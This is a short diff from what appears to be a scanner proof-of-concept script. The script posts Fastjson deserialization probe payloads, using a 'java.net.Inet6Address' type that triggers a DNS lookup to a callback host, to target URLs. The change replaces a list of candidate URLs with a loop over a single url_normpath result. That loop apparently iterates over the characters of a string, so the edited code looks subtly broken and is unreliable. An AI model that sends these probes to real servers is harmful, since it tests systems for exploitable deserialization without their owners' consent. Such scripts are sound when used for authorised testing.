@@ -37,12 +37,7 @@ class POC(Script):
                     {"test": {"@type": "java.net.Inet6Address", "val": dns}},
                 ]
                 for poc in pocs:
-                    path_list = list(set([
-                        self.url,
-                        self.url_normpath(self.base_url, '/'),
-                        self.url_normpath(self.url, './'),
-                    ]))
-                    for url in path_list:
+                    for url in  self.url_normpath(self.url, './'):
                         try:
                             async with session.post(url=url, json=poc) as res:
                                 pass
